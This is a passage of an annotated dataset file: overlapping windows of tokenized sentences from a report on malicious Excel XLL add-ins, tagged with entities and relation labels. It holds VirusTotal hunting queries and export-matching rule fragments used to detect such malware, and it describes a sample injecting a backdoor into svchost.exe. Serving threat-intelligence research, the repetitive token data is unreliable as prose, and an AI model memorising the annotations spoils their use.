"10,000", "exports", "."], ["This", "means", "that", "the", "standard", "search", "for", "xlAutoOpen", "export", "will", "not", "yield", "any", "Excel-DNA", "files", "in", "the", "search", "result", "."]], "vertexSet": [[{"type": "MF", "sent_id": 5, "global_pos": [154, 154], "name": "Excel-DNA files", "pos": [44, 46], "index": "0_0"}]], "labels": []}, {"title": "607-22", "sents": [["Excel-DNA", "requires", "the", "developer", "to", "instantiate", "an", "interface", "IExcelAddIn", "which", "will", "be", "called", "by", "the", "Excel-DNA", "loader", "."], ["The", "developer", "may", "then", "implement", "a", "class", "that", "will", "inherit", "from", "IExcelAddIn", "and", "define", "functions", "to", "overload", "the", "default", "implementations", "of", "functions", "that", "map", "to", "the", "functions", "automatically", "called", "by", "Excel", "."], ["For", "example", ",", "xlAutoOpen", "function", "is", "mapped", "to", "IExcelAddIn", "."], ["Evolution", "of", "malicious", "XLLsHunting", "for", "XLLs", "in", "VirusTotalArmed", "with", "the", "knowledge", "of", "what", "XLL", "files", "are", ",", "it", "will", "not", "be", "very", "difficult", "to", "search", "for", "the", "malicious", "files", "using", "the", "VirusTotal", "interface", "as", "well", "as", "internal", "sample", "repositories", "."], ["On", "VirusTotal", ",", "the", "basic", "way", "to", "search", "for", "malicious", "native", "XLL", "files", "submitted", "for", "the", "first", "time", ",", "for", "example", ",", "in", "November", "is", ":", "exports", ":", "xlAutoOpen", "positives:5+", "fs:2022-11-01+Perhaps", "also", "including", "XLLs", "that", "implement", "xlAutoClose", ":", "exports", ":", "xlAutoClose", "positives", "5+", "fs:2022-11-01+For", "Excel-DNA", "files", ",", "the", "situation", "is", "somewhat", "different", "."], ["Because", "an", "Excel-DNA", "compiled", "file", "is", "a", "shim", ",", "it", "contains", "over", "10,000", "exports", "."], ["This", "means", "that", "the", "standard", "search", "for", "xlAutoOpen", "export", "will", "not", "yield", "any", "Excel-DNA", "files", "in", "the", "search", "result", "."], ["DLLand", "pe.exports", "(", "``", "CalculationCanceled", "''", ")", "and", "pe.exports", "(", "``", "SyncMacro", "''", ")", "and", "new_fileand", "positives", ">", "3", "}", "for", "Excel-DNA", "based", "malicious", "XLLs", "."]], "vertexSet": [[{"type": "MF", "sent_id": 4, "global_pos": [144, 144], "name": "Excel-DNA files", "pos": [44, 46], "index": "0_0"}]], "labels": []}, {"title": "607-23", "sents": [["The", "developer", "may", "then", "implement", "a", "class", "that", "will", "inherit", "from", "IExcelAddIn", "and", "define", "functions", "to", "overload", "the", "default", "implementations", "of", "functions", "that", "map", "to", "the", "functions", "automatically", "called", "by", "Excel", "."], ["For", "example", ",", "xlAutoOpen", "function", "is", "mapped", "to", "IExcelAddIn", "."], ["Evolution", "of", "malicious", "XLLsHunting", "for", "XLLs", "in", "VirusTotalArmed", "with", "the", "knowledge", "of", "what", "XLL", "files", "are", ",", "it", "will", "not", "be", "very", "difficult", "to", "search", "for", "the", "malicious", "files", "using", "the", "VirusTotal", "interface", "as", "well", "as", "internal", "sample", "repositories", "."], ["On", "VirusTotal", ",", "the", "basic", "way", "to", "search", "for", "malicious", "native", "XLL", "files", "submitted", "for", "the", "first", "time", ",", "for", "example", ",", "in", "November", "is", ":", "exports", ":", "xlAutoOpen", "positives:5+", "fs:2022-11-01+Perhaps", "also", "including", "XLLs", "that", "implement", "xlAutoClose", ":", "exports", ":", "xlAutoClose", "positives", "5+", "fs:2022-11-01+For", "Excel-DNA", "files", ",", "the", "situation", "is", "somewhat", "different", "."], ["Because", "an", "Excel-DNA", "compiled", "file", "is", "a", "shim", ",", "it", "contains", "over", "10,000", "exports", "."], ["This", "means", "that", "the", "standard", "search", "for", "xlAutoOpen", "export", "will", "not", "yield", "any", "Excel-DNA", "files", "in", "the", "search", "result", "."], ["DLLand", "pe.exports", "(", "``", "CalculationCanceled", "''", ")", "and", "pe.exports", "(", "``", "SyncMacro", "''", ")", "and", "new_fileand", "positives", ">", "3", "}", "for", "Excel-DNA", "based", "malicious", "XLLs", "."], ["Monthly", "submissions", "of", "Excel-DNA", "compiled", "malicious", "XLL", "files", "from", "Jan", "2021", "."]], "vertexSet": [[{"type": "MF", "sent_id": 3, "global_pos": [126, 126], "name": "Excel-DNA files", "pos": [44, 46], "index": "0_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [202, 202], "name": "XLL files", "pos": [6, 8], "index": "1_0"}]], "labels": []}, {"title": "607-24", "sents": [["For", "example", ",", "xlAutoOpen", "function", "is", "mapped", "to", "IExcelAddIn", "."], ["Evolution", "of", "malicious", "XLLsHunting", "for", "XLLs", "in", "VirusTotalArmed", "with", "the", "knowledge", "of", "what", "XLL", "files", "are", ",", "it", "will", "not", "be", "very", "difficult", "to", "search", "for", "the", "malicious", "files", "using", "the", "VirusTotal", "interface", "as", "well", "as", "internal", "sample", "repositories", "."], ["On", "VirusTotal", ",", "the", "basic", "way", "to", "search", "for", "malicious", "native", "XLL", "files", "submitted", "for", "the", "first", "time", ",", "for", "example", ",", "in", "November", "is", ":", "exports", ":", "xlAutoOpen", "positives:5+", "fs:2022-11-01+Perhaps", "also", "including", "XLLs", "that", "implement", "xlAutoClose", ":", "exports", ":", "xlAutoClose", "positives", "5+", "fs:2022-11-01+For", "Excel-DNA", "files", ",", "the", "situation", "is", "somewhat", "different", "."], ["Because", "an", "Excel-DNA", "compiled", "file", "is", "a", "shim", ",", "it", "contains", "over", "10,000", "exports", "."], ["This", "means", "that", "the", "standard", "search", "for", "xlAutoOpen", "export", "will", "not", "yield", "any", "Excel-DNA", "files", "in", "the", "search", "result", "."], ["DLLand", "pe.exports", "(", "``", "CalculationCanceled", "''", ")", "and", "pe.exports", "(", "``", "SyncMacro", "''", ")", "and", "new_fileand", "positives", ">", "3", "}", "for", "Excel-DNA", "based", "malicious", "XLLs", "."], ["Monthly", "submissions", "of", "Excel-DNA", "compiled", "malicious", "XLL", "files", "from", "Jan", "2021", "."], ["Our", "search", "on", "VirusTotal", "has", "shown", "that", "malicious", "actors", "were", "well", "aware", "of", "the", "existence", "of", "XLL", "files", "and", "were", "using", "them", "way", "before", "Microsoft", "decided", "to", "start", "blocking", "documents", "containing", "VBA", "macros", "."]], "vertexSet": [[{"type": "MF", "sent_id": 2, "global_pos": [94, 94], "name": "Excel-DNA files", "pos": [44, 46], "index": "0_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [170, 170], "name": "XLL files", "pos": [6, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [184, 184], "name": "actors", "pos": [8, 9], "index": "2_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "XLL files", "pos": [16, 18], "index": "3_0"}]], "labels": [{"r": "WR", "evidence": [2, 3, 4, 5, 6, 7], "t": 0, "h": 2}, {"r": "WR", "evidence": [6, 7], "t": 1, "h": 2}, {"r": "WR", "evidence": [6, 7], "t": 1, "h": 2}, {"r": "WR", "evidence": [7], "h": 2, "t": 3}, {"r": "WR", "evidence": [7], "h": 2, "t": 3}]}, {"title": "607-25", "sents": [["Evolution", "of", "malicious", "XLLsHunting", "for", "XLLs", "in", "VirusTotalArmed", "with", "the", "knowledge", "of", "what", "XLL", "files", "are", ",", "it", "will", "not", "be", "very", "difficult", "to", "search", "for", "the", "malicious", "files", "using", "the", "VirusTotal", "interface", "as", "well", "as", "internal", "sample", "repositories", "."], ["On", "VirusTotal", ",", "the", "basic", "way", "to", "search", "for", "malicious", "native", "XLL", "files", "submitted", "for", "the", "first", "time", ",", "for", "example", ",", "in", "November", "is", ":", "exports", ":", "xlAutoOpen", "positives:5+", "fs:2022-11-01+Perhaps", "also", "including", "XLLs", "that", "implement", "xlAutoClose", ":", "exports", ":", "xlAutoClose", "positives", "5+", "fs:2022-11-01+For", "Excel-DNA", "files", ",", "the", "situation", "is", "somewhat", "different", "."], ["Because", "an", "Excel-DNA", "compiled", "file", "is", "a", "shim", ",", "it", "contains", "over", "10,000", "exports", "."], ["This", "means", "that", "the", "standard", "search", "for", "xlAutoOpen", "export", "will", "not", "yield", "any", "Excel-DNA", "files", "in", "the", "search", "result", "."], ["DLLand", "pe.exports", "(", "``", "CalculationCanceled", "''", ")", "and", "pe.exports", "(", "``", "SyncMacro", "''", ")", "and", "new_fileand", "positives", ">", "3", "}", "for", "Excel-DNA", "based", "malicious", "XLLs", "."], ["Monthly", "submissions", "of", "Excel-DNA", "compiled", "malicious", "XLL", "files", "from", "Jan", "2021", "."], ["Our", "search", "on", "VirusTotal", "has", "shown", "that", "malicious", "actors", "were", "well", "aware", "of", "the", "existence", "of", "XLL", "files", "and", "were", "using", "them", "way", "before", "Microsoft", "decided", "to", "start", "blocking", "documents", "containing", "VBA", "macros", "."], ["In", "July", "2017", ",", "a", "test", "sample", "with", "SHA256", "SHA", ",", "used", "to", "launch", "calc.exe", ",", "was", "submitted", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [84, 84], "name": "Excel-DNA files", "pos": [44, 46], "index": "0_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [160, 160], "name": "XLL files", "pos": [6, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [174, 174], "name": "actors", "pos": [8, 9], "index": "2_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [182, 182], "name": "XLL files", "pos": [16, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [209, 209], "name": "SHA", "pos": [9, 10], "index": "4_0"}]], "labels": [{"r": "WR", "evidence": [1, 2, 3, 4, 5, 6], "t": 0, "h": 2}, {"r": "WR", "evidence": [5, 6], "t": 1, "h": 2}, {"r": "WR", "evidence": [5, 6], "t": 1, "h": 2}, {"r": "WR", "evidence": [6], "h": 2, "t": 3}, {"r": "WR", "evidence": [6], "h": 2, "t": 3}, {"r": "WR", "evidence": [6, 7], "h": 2, "t": 4}]}, {"title": "607-26", "sents": [["On", "VirusTotal", ",", "the", "basic", "way", "to", "search", "for", "malicious", "native", "XLL", "files", "submitted", "for", "the", "first", "time", ",", "for", "example", ",", "in", "November", "is", ":", "exports", ":", "xlAutoOpen", "positives:5+", "fs:2022-11-01+Perhaps", "also", "including", "XLLs", "that", "implement", "xlAutoClose", ":", "exports", ":", "xlAutoClose", "positives", "5+", "fs:2022-11-01+For", "Excel-DNA", "files", ",", "the", "situation", "is", "somewhat", "different", "."], ["Because", "an", "Excel-DNA", "compiled", "file", "is", "a", "shim", ",", "it", "contains", "over", "10,000", "exports", "."], ["This", "means", "that", "the", "standard", "search", "for", "xlAutoOpen", "export", "will", "not", "yield", "any", "Excel-DNA", "files", "in", "the", "search", "result", "."], ["DLLand", "pe.exports", "(", "``", "CalculationCanceled", "''", ")", "and", "pe.exports", "(", "``", "SyncMacro", "''", ")", "and", "new_fileand", "positives", ">", "3", "}", "for", "Excel-DNA", "based", "malicious", "XLLs", "."], ["Monthly", "submissions", "of", "Excel-DNA", "compiled", "malicious", "XLL", "files", "from", "Jan", "2021", "."], ["Our", "search", "on", "VirusTotal", "has", "shown", "that", "malicious", "actors", "were", "well", "aware", "of", "the", "existence", "of", "XLL", "files", "and", "were", "using", "them", "way", "before", "Microsoft", "decided", "to", "start", "blocking", "documents", "containing", "VBA", "macros", "."], ["In", "July", "2017", ",", "a", "test", "sample", "with", "SHA256", "SHA", ",", "used", "to", "launch", "calc.exe", ",", "was", "submitted", "."], ["The", "sample", "SHA", "was", "submitted", "to", "VirusTotal", "in", "December", "2017", "and", "it", "contains", "functionality", "to", "inject", "the", "Backdoor", "Anel", "payload", "into", "the", "process", "space", "of", "svchost.exe", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [44, 44], "name": "Excel-DNA files", "pos": [44, 46], "index": "0_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [120, 120], "name": "XLL files", "pos": [6, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [134, 134], "name": "actors", "pos": [8, 9], "index": "2_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "XLL files", "pos": [16, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [169, 169], "name": "SHA", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [181, 181], "name": "SHA", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "it", "pos": [11, 12], "index": "6_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [204, 204], "name": "svchost.exe", "pos": [25, 26], "index": "7_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2, 3, 4, 5], "t": 0, "h": 2}, {"r": "WR", "evidence": [4, 5], "t": 1, "h": 2}, {"r": "WR", "evidence": [4, 5], "t": 1, "h": 2}, {"r": "WR", "evidence": [5], "h": 2, "t": 3}, {"r": "WR", "evidence": [5], "h": 2, "t": 3}, {"r": "WR", "evidence": [5, 6], "h": 2, "t": 4}, {"r": "WR", "evidence": [5, 6, 7], "t": 3, "h": 6}, {"r": "WR", "evidence": [6, 7], "t": 4, "h": 6}, {"r": "EX", "evidence": [7], "t": 5, "h": 6}, {"r": "IJ", "evidence": [7], "h": 6, "t": 7}]}, {"title": "607-27", "sents": [["Because", "an", "Excel-DNA", "compiled", "file", "is", "a", "shim", ",", "it", "contains", "over", "10,000", "exports", "."], ["This", "means", "that", "the", "standard", "search", "for", "xlAutoOpen", "export", "will", "not", "yield", "any", "Excel-DNA", "files", "in", "the", "search", "result", "."], ["DLLand", "pe.exports", "(", "``", "CalculationCanceled", "''", ")", "and", "pe.exports", "(", "``", "SyncMacro", "''", ")", "and", "new_fileand", "positives", ">", "3", "}", "for", "Excel-DNA", "based", "malicious", "XLLs", "."], ["Monthly", "submissions", "of", "Excel-DNA", "compiled", "malicious", "XLL", "files", "from", "Jan", "2021", "."], ["Our", "search", "on", "VirusTotal", "has", "shown", "that", "malicious", "actors", "were", "well", "aware", "of", "the", "existence", "of", "XLL", "files", "and", "were", "using", "them", "way", "before", "Microsoft", "decided", "to", "start", "blocking", "documents", "containing", "VBA", "macros", "."], ["In", "July", "2017", ",", "a", "test", "sample", "with", "SHA256", "SHA", ",", "used", "to", "launch", "calc.exe", ",", "was", "submitted", "."], ["The", "sample", "SHA", "was", "submitted", "to", "VirusTotal", "in", "December", "2017", "and", "it", "contains", "functionality", "to", "inject", "the", "Backdoor", "Anel", "payload", "into", "the", "process", "space", "of", "svchost.exe", "."], ["One", "of", "the", "components", "in", "the", "attack", ",", "a", "process", "injection", "DLL", "named", "onkeytoken_keb.dll", "(", "SHA", ")", ",", "also", "contains", "an", "xlAutoOpen", "export", ",", "although", "no", "malicious", "functionality", "is", "executed", "when", "calling", "it", "(", "the", "injector", "is", "triggered", "by", "calling", "the", "exported", "function", "OnKeyT_ContextInit", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "XLL files", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [81, 81], "name": "actors", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "XLL files", "pos": [16, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "SHA", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [128, 128], "name": "SHA", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "it", "pos": [11, 12], "index": "5_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [151, 151], "name": "svchost.exe", "pos": [25, 26], "index": "6_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [164, 164], "name": "DLL", "pos": [11, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [166, 166], "name": "onkeytoken_keb.dll", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "SHA", "pos": [15, 16], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [3, 4], "t": 0, "h": 1}, {"r": "WR", "evidence": [3, 4], "t": 0, "h": 1}, {"r": "WR", "evidence": [4], "h": 1, "t": 2}, {"r": "WR", "evidence": [4], "h": 1, "t": 2}, {"r": "WR", "evidence": [4, 5], "h": 1, "t": 3}, {"r": "WR", "evidence": [4, 5, 6], "t": 2, "h": 5}, {"r": "WR", "evidence": [5, 6], "t": 3, "h": 5}, {"r": "EX", "evidence": [6], "t": 4, "h": 5}, {"r": "IJ", "evidence": [6], "h": 5, "t": 6}, {"r": "CO", "evidence": [7], "h": 7, "t": 8}, {"r": "CO", "evidence": [7], "h": 7, "t": 9}]}, {"title": "607-28", "sents": [["This", "means", "that", "the", "standard", "search", "for", "xlAutoOpen", "export", "will", "not", "yield", "any", "Excel-DNA", "files", "in", "the", "search", "result", "."], ["DLLand", "pe.exports", "(", "``", "CalculationCanceled", "''", ")", "and", "pe.exports", "(", "``", "SyncMacro", "''", ")", "and", "new_fileand", "positives", ">", "3", "}", "for", "Excel-DNA", "based", "malicious", "XLLs", "."], ["Monthly", "submissions", "of", "Excel-DNA", "compiled", "malicious", "XLL", "files", "from", "Jan", "2021", "."], ["Our", "search", "on", "VirusTotal", "has", "shown", "that", "malicious", "actors", "were", "well", "aware", "of", "the", "existence", "of", "XLL", "files", "and", "were", "using", "them", "way", "before", "Microsoft", "decided", "to", "start", "blocking", "documents", "containing", "VBA", "macros", "."], ["In", "July", "2017", ",", "a", "test", "sample", "with", "SHA256", "SHA", ",", "used", "to", "launch", "calc.exe", ",", "was", "submitted", "."], ["The", "sample", "SHA", "was", "submitted", "to", "VirusTotal", "in", "December", "2017", "and", "it", "contains", "functionality", "to", "inject", "the", "Backdoor", "Anel", "payload", "into", "the", "process", "space", "of", "svchost.exe", "."], ["One", "of", "the", "components", "in", "the", "attack", ",", "a", "process", "injection", "DLL", "named", "onkeytoken_keb.dll", "(", "SHA", ")", ",", "also", "contains", "an", "xlAutoOpen", "export", ",", "although", "no", "malicious", "functionality", "is", "executed", "when", "calling", "it", "(", "the", "injector", "is", "triggered", "by", "calling", "the", "exported", "function", "OnKeyT_ContextInit", ")", "."], ["On", "October", "7th", "2022", ",", "a", "DLL", "SHA", ",", "with", "the", "name", "1.", "xll", ",", "was", "uploaded", "from", "a", "user", "in", "Pakistan", "."]], "vertexSet": [[{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "XLL files", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "actors", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "XLL files", "pos": [16, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [101, 101], "name": "SHA", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [113, 113], "name": "SHA", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [122, 122], "name": "it", "pos": [11, 12], "index": "5_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [136, 136], "name": "svchost.exe", "pos": [25, 26], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [149, 149], "name": "DLL", "pos": [11, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [151, 151], "name": "onkeytoken_keb.dll", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [153, 153], "name": "SHA", "pos": [15, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [190, 190], "name": "DLL", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "SHA", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [196, 196], "name": "1. xll", "pos": [12, 14], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [2, 3], "t": 0, "h": 1}, {"r": "WR", "evidence": [2, 3], "t": 0, "h": 1}, {"r": "WR", "evidence": [3], "h": 1, "t": 2}, {"r": "WR", "evidence": [3], "h": 1, "t": 2}, {"r": "WR", "evidence": [3, 4], "h": 1, "t": 3}, {"r": "WR", "evidence": [3, 4, 5], "t": 2, "h": 5}, {"r": "WR", "evidence": [4, 5], "t": 3, "h": 5}, {"r": "EX", "evidence": [5], "t": 4, "h": 5}, {"r": "IJ", "evidence": [5], "h": 5, "t": 6}, {"r": "CO", "evidence": [6], "h": 7, "t": 8}, {"r": "CO", "evidence": [6], "h": 7, "t": 9}, {"r": "CO", "evidence": [7], "h": 10, "t": 12}, {"r": "CO", "evidence": [7], "h": 10, "t": 11}]}, {"title": "607-29", "sents": [["DLLand", "pe.exports", "(", "``", "CalculationCanceled", "''", ")", "and", "pe.exports", "(", "``", "SyncMacro", "''", ")", "and", "new_fileand", "positives", ">", "3", "}", "for", "Excel-DNA", "based", "malicious", "XLLs", "."], ["Monthly", "submissions", "of", "Excel-DNA", "compiled", "malicious", "XLL", "files", "from", "Jan", "2021", "."], ["Our", "search", "on", "VirusTotal", "has", "shown", "that", "malicious", "actors", "were", "well", "aware", "of", "the", "existence", "of", "XLL", "files", "and", "were", "using", "them", "way", "before", "Microsoft", "decided", "to", "start", "blocking", "documents", "containing", "VBA", "macros", "."], ["In", "July", "2017", ",", "a", "test", "sample", "with", "SHA256", "SHA", ",", "used", "to", "launch", "calc.exe", ",", "was", "submitted", "."], ["The", "sample", "SHA", "was", "submitted", "to", "VirusTotal", "in", "December", "2017", "and", "it", "contains", "functionality", "to", "inject", "the", "Backdoor", "Anel", "payload", "into", "the", "process", "space", "of", "svchost.exe", "."], ["One", "of", "the", "components", "in", "the", "attack", ",", "a", "process", "injection", "DLL", "named", "onkeytoken_keb.dll", "(", "SHA", ")", ",", "also", "contains", "an", "xlAutoOpen", "export", ",", "although", "no", "malicious", "functionality", "is", "executed", "when", "calling", "it", "(", "the", "injector", "is", "triggered", "by", "calling", "the", "exported", "function", "OnKeyT_ContextInit", ")", "."], ["On", "October", "7th", "2022", ",", "a", "DLL", "SHA", ",", "with", "the", "name", "1.", "xll", ",", "was", "uploaded", "from", "a", "user", "in", "Pakistan", "."], ["The", "DLL", "contains", "two", "exports", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "XLL files", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "actors", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "XLL files", "pos": [16, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "SHA", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "SHA", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "it", "pos": [11, 12], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [116, 116], "name": "svchost.exe", "pos": [25, 26], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [129, 129], "name": "DLL", "pos": [11, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [131, 131], "name": "onkeytoken_keb.dll", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "SHA", "pos": [15, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [170, 170], "name": "DLL", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [171, 171], "name": "SHA", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [176, 176], "name": "1. xll", "pos": [12, 14], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [188, 188], "name": "DLL", "pos": [1, 2], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "WR", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "WR", "evidence": [2], "h": 1, "t": 2}, {"r": "WR", "evidence": [2], "h": 1, "t": 2}, {"r": "WR", "evidence": [2, 3], "h": 1, "t": 3}, {"r": "WR", "evidence": [2, 3, 4], "t": 2, "h": 5}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 5}, {"r": "EX", "evidence": [4], "t": 4, "h": 5}, {"r": "IJ", "evidence": [4], "h": 5, "t": 6}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 6, "t": 13}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 6, "t": 13}, {"r": "EX", "evidence": [4, 5, 6, 7], "h": 6, "t": 13}, {"r": "CO", "evidence": [5], "h": 7, "t": 8}, {"r": "CO", "evidence": [5], "h": 7, "t": 9}, {"r": "CO", "evidence": [6], "h": 10, "t": 12}, {"r": "CO", "evidence": [6], "h": 10, "t": 11}]}, {"title": "607-30", "sents": [["Monthly", "submissions", "of", "Excel-DNA", "compiled", "malicious", "XLL", "files", "from", "Jan", "2021", "."], ["Our", "search", "on", "VirusTotal", "has", "shown", "that", "malicious", "actors", "were", "well", "aware", "of", "the", "existence", "of", "XLL", "files", "and", "were", "using", "them", "way", "before", "Microsoft", "decided", "to", "start", "blocking", "documents", "containing", "VBA", "macros", "."], ["In", "July", "2017", ",", "a", "test", "sample", "with", "SHA256", "SHA", ",", "used", "to", "launch", "calc.exe", ",", "was", "submitted", "."], ["The", "sample", "SHA", "was", "submitted", "to", "VirusTotal", "in", "December", "2017", "and", "it", "contains", "functionality", "to", "inject", "the", "Backdoor", "Anel", "payload", "into", "the", "process", "space", "of", "svchost.exe", "."], ["One", "of", "the", "components", "in", "the", "attack", ",", "a", "process", "injection", "DLL", "named", "onkeytoken_keb.dll", "(", "SHA", ")", ",", "also", "contains", "an", "xlAutoOpen", "export", ",", "although", "no", "malicious", "functionality", "is", "executed", "when", "calling", "it", "(", "the", "injector", "is", "triggered", "by", "calling", "the", "exported", "function", "OnKeyT_ContextInit", ")", "."], ["On", "October", "7th", "2022", ",", "a", "DLL", "SHA", ",", "with", "the", "name", "1.", "xll", ",", "was", "uploaded", "from", "a", "user", "in", "Pakistan", "."], ["The", "DLL", "contains", "two", "exports", "."], ["The", "second", "export", "name", "is", "xlAutoOpen", ",", "which", "makes", "the", "implant", "a", "fully", "functional", ",", "native-based", "XLL", "payload", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "XLL files", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "actors", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "XLL files", "pos": [16, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "SHA", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "SHA", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "it", "pos": [11, 12], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [90, 90], "name": "svchost.exe", "pos": [25, 26], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "DLL", "pos": [11, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [105, 105], "name": "onkeytoken_keb.dll", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [107, 107], "name": "SHA", "pos": [15, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [144, 144], "name": "DLL", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [145, 145], "name": "SHA", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "1. xll", "pos": [12, 14], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "DLL", "pos": [1, 2], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "WR", "evidence": [1, 2, 3], "t": 2, "h": 5}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 5}, {"r": "EX", "evidence": [3], "t": 4, "h": 5}, {"r": "IJ", "evidence": [3], "h": 5, "t": 6}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 6, "t": 13}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 6, "t": 13}, {"r": "EX", "evidence": [3, 4, 5, 6], "h": 6, "t": 13}, {"r": "CO", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4], "h": 7, "t": 9}, {"r": "CO", "evidence": [5], "h": 10, "t": 12}, {"r": "CO", "evidence": [5], "h": 10, "t": 11}]}, {"title": "607-31", "sents": [["Our", "search", "on", "VirusTotal", "has", "shown", "that", "malicious", "actors", "were", "well", "aware", "of", "the", "existence", "of", "XLL", "files", "and", "were", "using", "them", "way", "before", "Microsoft", "decided", "to", "start", "blocking", "documents", "containing", "VBA", "macros", "."], ["In", "July", "2017", ",", "a", "test", "sample", "with", "SHA256", "SHA", ",", "used", "to", "launch", "calc.exe", ",", "was", "submitted", "."], ["The", "sample", "SHA", "was", "submitted", "to", "VirusTotal", "in", "December", "2017", "and", "it", "contains", "functionality", "to", "inject", "the", "Backdoor", "Anel", "payload", "into", "the", "process", "space", "of", "svchost.exe", "."], ["One", "of", "the", "components", "in", "the", 